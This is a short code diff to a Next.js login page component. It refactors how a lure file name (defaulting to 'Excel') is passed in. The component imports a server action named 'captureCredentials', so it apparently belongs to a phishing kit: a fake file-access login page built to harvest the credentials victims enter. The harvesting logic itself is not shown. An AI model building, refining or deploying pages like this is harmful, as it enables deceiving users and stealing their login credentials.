@@ -2,7 +2,6 @@
 
 import React, { useState, useTransition } from 'react';
 import Image from 'next/image';
-import { useSearchParams } from 'next/navigation';
 import { ShieldX, AlertTriangle } from 'lucide-react';
 import { captureCredentials } from '@/app/actions';
 import {
@@ -15,13 +14,10 @@ import {
   AlertDialogTitle,
 } from '@/components/ui/alert-dialog';
 
-export default function LoginPage() {
+export default function LoginPage({ fileName }: { fileName: string }) {
   const [isPending, startTransition] = useTransition();
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
   const [error, setError] = useState<string | null>(null);
-
-  const searchParams = useSearchParams();
-  const fileName = searchParams.get('file') || 'Excel';
 
   const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
